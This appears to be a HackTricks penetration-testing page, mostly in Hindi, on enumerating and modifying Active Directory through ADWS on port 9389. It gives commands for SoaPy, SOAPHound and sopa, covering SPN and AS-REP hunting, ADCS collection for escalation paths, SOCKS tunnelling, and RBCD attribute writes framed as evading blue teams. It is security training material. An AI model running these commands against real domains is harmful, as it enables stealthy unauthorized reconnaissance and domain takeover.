# Active Directory Web Services (ADWS) Enumeration & Stealth Collection

{{#include ../../banners/hacktricks-training.md}}

## ADWS क्या है?

Active Directory Web Services (ADWS) हर Domain Controller पर Windows Server 2008 R2 से डिफॉल्ट रूप से सक्षम होता है और TCP 9389 पर सुनता है। नाम के बावजूद, कोई HTTP शामिल नहीं है। इसके बजाय, यह सेवा LDAP-style डेटा को एक मालिकाना .NET framing protocols स्टैक के माध्यम से एक्सपोज़ करती है:

* MC-NBFX → MC-NBFSE → MS-NNS → MC-NMF

क्योंकि ट्रैफ़िक इन बाइनरी SOAP फ़्रेम्स में एन्कैप्सुलेट होता है और एक असामान्य पोर्ट पर यात्रा करता है, **enumeration through ADWS पारंपरिक LDAP/389 & 636 ट्रैफ़िक की तुलना में निरीक्षित, फ़िल्टर या सिग्नेचर किए जाने की संभावना बहुत कम है**। ऑपरेटरों के लिए इसका मतलब है:

* Stealthier recon – Blue teams अक्सर LDAP queries पर केंद्रित होते हैं।
* SOCKS proxy के माध्यम से 9389/TCP टनल करके **non-Windows hosts (Linux, macOS)** से संग्रह करने की स्वतंत्रता।
* वही डेटा जो आप LDAP से प्राप्त करेंगे (users, groups, ACLs, schema, आदि) और **writes** करने की क्षमता (उदा. `msDs-AllowedToActOnBehalfOfOtherIdentity` for **RBCD**)।

ADWS interactions को WS-Enumeration पर लागू किया गया है: हर क्वेरी एक `Enumerate` संदेश के साथ शुरू होती है जो LDAP filter/attributes को परिभाषित करता है और एक `EnumerationContext` GUID लौटाती है, इसके बाद एक या अधिक `Pull` संदेश आते हैं जो सर्वर-परिभाषित परिणाम विंडो तक स्ट्रीम करते हैं। Contexts लगभग 30 मिनट के बाद expire हो जाते हैं, इसलिए टूलिंग को परिणामों को पेज करना होगा या state खोने से बचने के लिए फ़िल्टर्स को विभाजित (प्रत्येक CN के लिए prefix queries) करना होगा। जब security descriptors के लिए अनुरोध करें, तो SACLs को छोड़ने के लिए `LDAP_SERVER_SD_FLAGS_OID` कंट्रोल निर्दिष्ट करें, अन्यथा ADWS अपने SOAP response से `nTSecurityDescriptor` attribute को ही हटा देता है।

> नोट: ADWS कई RSAT GUI/PowerShell tools द्वारा भी उपयोग किया जाता है, इसलिए ट्रैफ़िक वैध admin activity के साथ मिला-जुला हो सकता है।

## SoaPy – Native Python Client

[SoaPy](https://github.com/logangoins/soapy) pure Python में ADWS protocol स्टैक का एक पूरा पुनः-कार्यान्वयन है। यह NBFX/NBFSE/NNS/NMF फ़्रेम्स को बाइट-फोर-बाइट बनाता है, जिससे .NET runtime को छुए बिना Unix-like सिस्टम्स से संग्रह संभव होता है।

### मुख्य विशेषताएँ

* SOCKS के माध्यम से proxying का समर्थन (C2 implants से उपयोगी)।
* LDAP के समान fine-grained search filters `-q '(objectClass=user)'`।
* ऐच्छिक **write** ऑपरेशन्स (`--set` / `--delete`)।
* BloodHound में डायरेक्ट ingestion के लिए **BOFHound output mode**।
* मानव पठनीयता की आवश्यकता होने पर timestamps / `userAccountControl` को सुंदर करने के लिए `--parse` फ़्लैग।

### लक्षित संग्रह flags एवं write ऑपरेशन्स

SoaPy क्यूरेटेड स्विचेस के साथ आता है जो ADWS पर सबसे सामान्य LDAP hunting tasks को दोहराते हैं: `--users`, `--computers`, `--groups`, `--spns`, `--asreproastable`, `--admins`, `--constrained`, `--unconstrained`, `--rbcds`, साथ ही कस्टम पुल्स के लिए raw `--query` / `--filter` नॉब्स। इन्हें write primitives के साथ जोड़ा जा सकता है जैसे `--rbcd <source>` (sets `msDs-AllowedToActOnBehalfOfOtherIdentity`), `--spn <service/cn>` (SPN staging for targeted Kerberoasting) और `--asrep` (`userAccountControl` में `DONT_REQ_PREAUTH` फ्लिप करने के लिए)।

उदाहरण targeted SPN hunt जो केवल `samAccountName` और `servicePrincipalName` लौटाता है:
```bash
soapy corp.local/alice:'Winter2025!'@dc01.corp.local \
--spns -f samAccountName,servicePrincipalName --parse
```
इसी host/credentials का उपयोग करके तुरंत findings को weaponise करें: RBCD-capable objects को `--rbcds` के साथ dump करें, फिर `--rbcd 'WEBSRV01$' --account 'FILE01$'` लागू करके एक Resource-Based Constrained Delegation chain stage करें (पूर्ण abuse path के लिए देखें [Resource-Based Constrained Delegation](resource-based-constrained-delegation.md)).

### इंस्टॉलेशन (operator host)
```bash
python3 -m pip install soapy-adws   # or git clone && pip install -r requirements.txt
```
## Sopa - ADWS के लिए Golang में एक व्यावहारिक क्लाइंट

Similarly as soapy, [sopa](https://github.com/Macmod/sopa) implements the ADWS protocol stack (MS-NNS + MC-NMF + SOAP) in Golang, exposing command-line flags to issue ADWS calls such as:

* **ऑब्जेक्ट खोज और पुनर्प्राप्ति** - `query` / `get`
* **ऑब्जेक्ट जीवनचक्र** - `create [user|computer|group|ou|container|custom]` और `delete`
* **एट्रिब्यूट संपादन** - `attr [add|replace|delete]`
* **खाता प्रबंधन** - `set-password` / `change-password`
* और अन्य जैसे `groups`, `members`, `optfeature`, `info [version|domain|forest|dcs]`, आदि।

## SOAPHound – हाई-वॉल्यूम ADWS संग्रह (Windows)

[FalconForce SOAPHound](https://github.com/FalconForceTeam/SOAPHound) एक .NET कलेक्टर है जो सभी LDAP इंटरैक्शंस को ADWS के अंदर रखता है और BloodHound v4-compatible JSON उत्पन्न करता है। यह एक बार `objectSid`, `objectGUID`, `distinguishedName` और `objectClass` का एक पूरा कैश बनाता है (`--buildcache`), फिर इसे high-volume `--bhdump`, `--certdump` (ADCS), या `--dnsdump` (AD-integrated DNS) पासों के लिए पुन: उपयोग करता है ताकि केवल लगभग ~35 महत्वपूर्ण एट्रिब्यूट ही DC से बाहर जायें। AutoSplit (`--autosplit --threshold <N>`) बड़ी forests में 30-मिनट EnumerationContext timeout के अंदर रहने के लिए CN prefix द्वारा क्वेरीज़ को स्वचालित रूप से शार्ड करता है।

Typical workflow on a domain-joined operator VM:
```powershell
# Build cache (JSON map of every object SID/GUID)
SOAPHound.exe --buildcache -c C:\temp\corp-cache.json

# BloodHound collection in autosplit mode, skipping LAPS noise
SOAPHound.exe -c C:\temp\corp-cache.json --bhdump \
--autosplit --threshold 1200 --nolaps \
-o C:\temp\BH-output

# ADCS & DNS enrichment for ESC chains
SOAPHound.exe -c C:\temp\corp-cache.json --certdump -o C:\temp\BH-output
SOAPHound.exe --dnsdump -o C:\temp\dns-snapshot
```
Exported JSON को सीधे SharpHound/BloodHound वर्कफ़्लो में डाल सकते हैं—downstream ग्राफिंग आइडियाज के लिए [BloodHound methodology](bloodhound.md) देखें। AutoSplit SOAPHound को कई मिलियन ऑब्जेक्ट वाले फ़ॉरेस्ट्स पर अधिक सहनशील बनाता है और क्वेरी की संख्या को ADExplorer-style snapshots की तुलना में कम रखता है।

## Stealth AD संग्रह कार्यप्रवाह

निम्न कार्यप्रवाह दिखाता है कि कैसे ADWS के माध्यम से **domain & ADCS objects** को सूचीबद्ध कर उन्हें BloodHound JSON में कन्वर्ट किया जाए और सर्टिफिकेट-आधारित attack paths का पता लगाया जाए — वह सब Linux से:

1. **Tunnel 9389/TCP** को target network से अपनी मशीन तक टनल करें (उदा. Chisel, Meterpreter, SSH dynamic port-forward, आदि के जरिए)। `export HTTPS_PROXY=socks5://127.0.0.1:1080` एक्सपोर्ट करें या SoaPy’s `--proxyHost/--proxyPort` का उपयोग करें।

2. **रूट domain object इकट्ठा करें:**
```bash
soapy ludus.domain/jdoe:'P@ssw0rd'@10.2.10.10 \
-q '(objectClass=domain)' \
| tee data/domain.log
```
3. **Configuration NC से ADCS-संबंधी ऑब्जेक्ट्स एकत्र करें:**
```bash
soapy ludus.domain/jdoe:'P@ssw0rd'@10.2.10.10 \
-dn 'CN=Configuration,DC=ludus,DC=domain' \
-q '(|(objectClass=pkiCertificateTemplate)(objectClass=CertificationAuthority) \\
(objectClass=pkiEnrollmentService)(objectClass=msPKI-Enterprise-Oid))' \
| tee data/adcs.log
```
4. **BloodHound में परिवर्तित करें:**
```bash
bofhound -i data --zip   # produces BloodHound.zip
```
5. BloodHound GUI में **ZIP अपलोड करें** और `MATCH (u:User)-[:Can_Enroll*1..]->(c:CertTemplate) RETURN u,c` जैसी cypher क्वेरीज़ चलाएँ ताकि certificate escalation paths (ESC1, ESC8, आदि) प्रकट हों।

### `msDs-AllowedToActOnBehalfOfOtherIdentity` लिखना (RBCD)
```bash
soapy ludus.domain/jdoe:'P@ssw0rd'@dc.ludus.domain \
--set 'CN=Victim,OU=Servers,DC=ludus,DC=domain' \
msDs-AllowedToActOnBehalfOfOtherIdentity 'B:32:01....'
```
इसे `s4u2proxy`/`Rubeus /getticket` के साथ मिलाएँ ताकि एक पूर्ण **Resource-Based Constrained Delegation** chain बन सके (देखें [Resource-Based Constrained Delegation](resource-based-constrained-delegation.md)).

## टूलिंग सारांश

| उद्देश्य | टूल | नोट्स |
|---------|------|-------|
| ADWS enumeration | [SoaPy](https://github.com/logangoins/soapy) | Python, SOCKS, read/write |
| High-volume ADWS dump | [SOAPHound](https://github.com/FalconForceTeam/SOAPHound) | .NET, cache-first, BH/ADCS/DNS modes |
| BloodHound ingest | [BOFHound](https://github.com/bohops/BOFHound) | Converts SoaPy/ldapsearch logs |
| Cert compromise | [Certipy](https://github.com/ly4k/Certipy) | Can be proxied through same SOCKS |
| ADWS enumeration & object changes | [sopa](https://github.com/Macmod/sopa) | Generic client to interface with known ADWS endpoints - allows for enumeration, object creation, attribute modifications, and password changes |

## संदर्भ

* [SpecterOps – Make Sure to Use SOAP(y) – An Operators Guide to Stealthy AD Collection Using ADWS](https://specterops.io/blog/2025/07/25/make-sure-to-use-soapy-an-operators-guide-to-stealthy-ad-collection-using-adws/)
* [SoaPy GitHub](https://github.com/logangoins/soapy)
* [BOFHound GitHub](https://github.com/bohops/BOFHound)
* [Microsoft – MC-NBFX, MC-NBFSE, MS-NNS, MC-NMF specifications](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-nbfx/)
* [IBM X-Force Red – Stealthy Enumeration of Active Directory Environments Through ADWS](https://logan-goins.com/2025-02-21-stealthy-enum-adws/)
* [FalconForce – SOAPHound tool to collect Active Directory data via ADWS](https://falconforce.nl/soaphound-tool-to-collect-active-directory-data-via-adws/)

{{#include ../../banners/hacktricks-training.md}}
